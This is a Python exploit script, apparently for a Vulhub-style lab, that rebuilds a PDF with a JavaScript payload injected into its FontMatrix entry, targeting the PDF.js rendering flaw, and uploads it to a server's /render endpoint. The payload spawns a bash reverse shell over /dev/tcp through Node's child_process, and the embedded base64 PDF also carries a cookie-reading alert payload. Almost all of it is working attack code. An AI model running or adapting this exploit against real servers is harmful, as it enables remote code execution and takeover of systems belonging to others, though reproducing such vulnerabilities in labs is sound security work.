#!/usr/bin/env python3
"""Upload a FontMatrix PDF that launches a shell during PDF.js rendering."""

import base64
import hashlib
import http.client
import json
import os
import re
import time
import urllib.parse


BASE_PDF_BASE64 = (
    'JVBERi0xLjQKJQo4IDAgb2JqCjw8Ci9QYXR0ZXJuVHlwZSAyCi9TaGFkaW5nPDwKICAvRnVuY3Rp'
    'b248PAogICAgL0RvbWFpblswIDFdCiAgICAvQzBbMCAwIDFdCiAgICAvQzFbMSAwLjYgMF0KICAg'
    'IC9OIDEKICAgIC9GdW5jdGlvblR5cGUgMgogID4+CiAgL1NoYWRpbmdUeXBlIDIKICAvQ29vcmRz'
    'WzQ2IDQwMCA1MzcgNDAwXQogIC9FeHRlbmRbZmFsc2UgZmFsc2VdCiAgL0NvbG9yU3BhY2UvRGV2'
    'aWNlUkdCCj4+Ci9UeXBlL1BhdHRlcm4KPj4KZW5kb2JqCjUgMCBvYmoKPDwKL1dpZHRoc1s1NzMg'
    'MCA1ODIgMCA1NDggMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAw'
    'IDAgMCAwIDAgNTczIDAgNTczIDAgMzQxXQovVHlwZS9Gb250Ci9CYXNlRm9udC9QQVhFS08rU291'
    'cmNlU2Fuc1Byby1Cb2xkCi9MYXN0Q2hhciAxMDIKL0VuY29kaW5nL1dpbkFuc2lFbmNvZGluZwov'
    'Rm9udE1hdHJpeCBbMC4xIDAgMCAwLjEgMCAoMVwpOyBcbmFsZXJ0XCgnZG9jdW1lbnQuZG9tYWlu'
    'OiAnK3dpbmRvdy5kb2N1bWVudC5kb21haW4rJ1xcbmxvY2F0aW9uOiAnK3dpbmRvdy5sb2NhdGlv'
    'bisnXFxuY29va2llOiAnK3dpbmRvdy5kb2N1bWVudC5jb29raWUpXQovU3VidHlwZS9UeXBlMQov'
    'Rmlyc3RDaGFyIDY1Ci9Gb250RGVzY3JpcHRvciA5IDAgUgo+PgplbmRvYmoKMiAwIG9iago8PAov'
    'S2lkc1szIDAgUl0KL1R5cGUvUGFnZXMKL0NvdW50IDEKPj4KZW5kb2JqCjkgMCBvYmoKPDwKL1R5'
    'cGUvRm9udERlc2NyaXB0b3IKL0l0YWxpY0FuZ2xlIDAKL0FzY2VudCA3NTEKL0ZvbnRCQm94Wy02'
    'IC0xMiA1NzkgNzEzXQovRm9udE5hbWUvUEFYRUtPK1NvdXJjZVNhbnNQcm8tQm9sZAovU3RlbVYg'
    'MTAwCi9DYXBIZWlnaHQgNzEzCi9GbGFncyAzMgovRm9udEZpbGUzIDEwIDAgUgovRGVzY2VudCAt'
    'MTczCi9NaXNzaW5nV2lkdGggMjUwCj4+CmVuZG9iago2IDAgb2JqCjw8Ci9MZW5ndGggMTI4Cj4+'
    'CnN0cmVhbQo0NyAzNzkgNDg5IDIzMCByZSBTCi9QYXR0ZXJuIGNzCkJUCiAgNTAgNTAwIFRkCiAg'
    'MTE3IFRMCiAgL0YxIDE1MCBUZgogIC9QMSBzY24KICAoQWJDZEVmKSBUagogIC9QMiBzY24KICAo'
    'QWJDZEVmKSAnCkVUCmVuZHN0cmVhbQplbmRvYmoKMyAwIG9iago8PAovVHlwZS9QYWdlCi9SZXNv'
    'dXJjZXMgNCAwIFIKL0NvbnRlbnRzIDYgMCBSCi9QYXJlbnQgMiAwIFIKL01lZGlhQm94WzAgMCA1'
    'OTUuMjc1NiA4NDEuODg5OF0KPj4KZW5kb2JqCjEwIDAgb2JqCjw8Ci9MZW5ndGggODAwCi9TdWJ0'
    'eXBlL1R5cGUyCj4+CnN0cmVhbQoKZW5kc3RyZWFtCmVuZG9iago3IDAgb2JqCjw8Ci9QYXR0ZXJu'
    'VHlwZSAxCi9NYXRyaXhbMSAwIDAgMSA1MCAwXQovTGVuZ3RoIDU4Ci9UaWxpbmdUeXBlIDEKL0JC'
    'b3hbMCAwIDE2IDE2XQovWVN0ZXAgMTYKL1BhaW50VHlwZSAxCi9SZXNvdXJjZXM8PAo+PgovWFN0'
    'ZXAgMTYKPj4Kc3RyZWFtCjAuNjUgZwowIDAgMTYgMTYgcmUgZgowLjE1IGcKMCAwIDggOCByZSBm'
    'CjggOCA4IDggcmUgZgplbmRzdHJlYW0KZW5kb2JqCjQgMCBvYmoKPDwKL1BhdHRlcm48PAogIC9Q'
    'MSA3IDAgUgogIC9QMiA4IDAgUgo+PgovRm9udDw8CiAgL0YxIDUgMCBSCj4+Cj4+CmVuZG9iagox'
    'IDAgb2JqCjw8Ci9QYWdlcyAyIDAgUgovVHlwZS9DYXRhbG9nCi9PcGVuQWN0aW9uWzMgMCBSIC9G'
    'aXRdCj4+CmVuZG9iagoKeHJlZgowIDExCjAwMDAwMDAwMDAgNjU1MzUgZiAKMDAwMDAwMjI2MCAw'
    'MDAwMCBuIAowMDAwMDAwNTIyIDAwMDAwIG4gCjAwMDAwMDA5NzMgMDAwMDAgbiAKMDAwMDAwMjE3'
    'OCAwMDAwMCBuIAowMDAwMDAwMjY2IDAwMDAwIG4gCjAwMDAwMDA3OTQgMDAwMDAgbiAKMDAwMDAw'
    'MTk1MyAwMDAwMCBuIAowMDAwMDAwMDE1IDAwMDAwIG4gCjAwMDAwMDA1NzcgMDAwMDAgbiAKMDAw'
    'MDAwMTA4NSAwMDAwMCBuIAp0cmFpbGVyCjw8Ci9JRFsodzRmKSAodzRmKV0KL1Jvb3QgMSAwIFIK'
    'L1NpemUgMTEKPj4Kc3RhcnR4cmVmCjIzMzMKJSVFT0Y='
)
SHELL_CODE = (
    "1); process.mainModule.require('child_process').spawn("
    "'bash',['-c','bash -i >& /dev/tcp/localhost/4444 0>&1'],"
    "{detached:true,stdio:'ignore'}).unref("
)


def build_pdf() -> bytes:
    original = base64.b64decode(BASE_PDF_BASE64)
    escaped = SHELL_CODE.replace("\\", "\\\\").replace("(", "\\(").replace(")", "\\)")
    replacement = f"/FontMatrix [0.1 0 0 0.1 0 ({escaped})]".encode("ascii")
    changed, count = re.subn(
        rb"/FontMatrix \[[^\]]+\]",
        lambda match: replacement,
        original,
        count=1,
    )
    if count != 1:
        raise RuntimeError("Vulhub PDF did not contain one FontMatrix")
    body = changed.split(b"\nxref\n")[0] + b"\n"
    offsets = {
        int(match.group(1)): match.start()
        for match in re.finditer(rb"(?m)^(\d+) 0 obj\b", body)
    }
    if set(offsets) != set(range(1, 11)):
        raise RuntimeError("Vulhub PDF object table changed")
    start = len(body)
    xref = b"xref\n0 11\n0000000000 65535 f \n" + b"".join(
        f"{offsets[index]:010d} 00000 n \n".encode("ascii")
        for index in range(1, 11)
    )
    trailer = (
        b"trailer\n<< /Root 1 0 R /Size 11 >>\nstartxref\n"
        + str(start).encode("ascii")
        + b"\n%%EOF\n"
    )
    return body + xref + trailer


def upload_pdf(target_url: str, data: bytes) -> int:
    target = urllib.parse.urlsplit(target_url)
    if target.scheme != "http" or not target.hostname:
        raise ValueError("target URL must be HTTP with a hostname")
    connection = http.client.HTTPConnection(target.hostname, target.port or 80, timeout=30)
    try:
        connection.request(
            "POST",
            "/render",
            body=data,
            headers={"Content-Type": "application/pdf"},
        )
        response = connection.getresponse()
        response.read()
        return response.status
    finally:
        connection.close()


def main() -> None:
    target_url = os.environ.get("REMOTE_TARGET_URL") or os.environ["LOCAL_TARGET_URL"]
    pdf = build_pdf()
    status = upload_pdf(target_url, pdf)
    if status != 202:
        raise RuntimeError(f"PDF render request returned HTTP {status}")
    time.sleep(3)
    print(json.dumps({
        "evidence_payload": {},
        "request_status": status,
        "pdf_sha256": hashlib.sha256(pdf).hexdigest(),
    }))


if __name__ == "__main__":
    main()
